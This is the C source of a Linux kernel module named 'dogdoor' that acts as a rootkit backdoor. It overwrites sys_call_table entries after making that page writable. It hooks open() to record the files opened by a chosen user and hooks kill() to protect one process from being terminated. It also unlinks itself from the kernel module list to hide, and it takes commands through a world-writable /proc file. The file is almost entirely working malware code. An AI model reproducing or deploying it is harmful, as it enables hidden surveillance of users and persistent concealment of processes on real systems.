#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <asm/unistd.h>

MODULE_LICENSE("GPL");

char username[64] = "-";
uid_t uid = -1;
int t_pid = -1;
int listflag = 0;
int hideflag = 0;
int hidestate = 0;
void ** sctable ;

char fnames[10][64] ;
int g_ind = 0 ;
int g_count = 0;

struct list_head * m = 0x0;

asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
asmlinkage int (*orig_sys_kill)(pid_t pid, int sig) ; 

asmlinkage int dogdoor_sys_kill(pid_t pid, int sig)
{
    printk("You tried to kill %d with %d\n", pid, sig);
    if(t_pid == pid)
        return 0;
    else
        return orig_sys_kill(pid, sig);
}

asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
{

	if (uid != -1 && uid == current_cred()->uid.val ) {
		copy_from_user(fnames[g_ind], filename, 64) ;
        g_ind = (g_ind + 1) % 10;
        g_count++;
        if(g_count > 10)
            g_count = 10;
	}
	return orig_sys_open(filename, flags, mode) ;
}

void hide_module(void)
{
    struct list_head list = THIS_MODULE->list ;
    struct list_head * prev = &list;
    struct module * mod;
    for(m = (&list)->next ; m != (&list); m = m-> next){
        mod = list_entry(m, struct module, list);
        if(strcmp(mod->name, "dogdoor") == 0){
            list_del(m);
            return ;
        }
        prev = m;
    }
}

void show_module(void)
{
    struct list_head list = THIS_MODULE->list ;
    list_add(m, (&list)->next);
}


static 
int dogdoor_proc_open(struct inode *inode, struct file *file) {
	return 0 ;
}

static 
int dogdoor_proc_release(struct inode *inode, struct file *file) {
	return 0 ;
}

static
ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	ssize_t toread ;
    char * buf = kmalloc(sizeof(char) * 2048, GFP_KERNEL);
    int ind = g_ind;
    int nfile = g_count; 
    int i = 1;
        
    sprintf(buf, "===== [%s] =====\n", username);
    
    while(uid != -1 && i <= nfile){
        ind = ind - i;
        if(ind == -1)
            ind = 9;
        strcat(buf, fnames[ind]);
        strcat(buf, "\n");
        i++;
    }
    printk("PROC_READ : %s", buf);
    toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;	

	*offset = *offset + toread ;


    kfree(buf);

	return toread ;
}

static 
ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{
	char buf[128] ;
    

	if (*offset != 0 || size > 128)
		return -EFAULT ;

	if (copy_from_user(buf, ubuf, size))
		return -EFAULT ;


    sscanf(buf,"%s %d %d %d %d", username, &uid, &listflag, &t_pid, &hideflag) ;
    printk("PROC_WRITE : %s", buf);
    *offset = strlen(buf) ;


    if(hideflag){
        if(hidestate)
            show_module();
        else
            hide_module();
        hidestate = ~hidestate; 
    }


	return *offset ;
}

static const struct file_operations dogdoor_fops = {
	.owner = 	THIS_MODULE,
	.open = 	dogdoor_proc_open,
	.read = 	dogdoor_proc_read,
	.write = 	dogdoor_proc_write,
	.llseek = 	seq_lseek,
	.release = 	dogdoor_proc_release,
} ;

static 
int __init dogdoor_init(void) {
	unsigned int level ; 
	pte_t * pte ;
    int i;
	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;

	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_open = sctable[__NR_open] ;
	orig_sys_kill = sctable[__NR_kill] ;

	pte = lookup_address((unsigned long) sctable, &level) ;
	if (pte->pte &~ _PAGE_RW) 
		pte->pte |= _PAGE_RW ;	

	sctable[__NR_open] = dogdoor_sys_open ;
	sctable[__NR_kill] = dogdoor_sys_kill ;

   
    for(i = 0 ; i < 10; i++){
        memset(fnames[i], 0, 64);
    }
	return 0;
}

static 
void __exit dogdoor_exit(void) {
	unsigned int level ;
	pte_t * pte ;
	remove_proc_entry("dogdoor", NULL) ;

	sctable[__NR_open] = orig_sys_open ;
	sctable[__NR_kill] = orig_sys_kill;
	pte = lookup_address((unsigned long) sctable, &level) ;
	pte->pte = pte->pte &~ _PAGE_RW ;
}

module_init(dogdoor_init);
module_exit(dogdoor_exit);
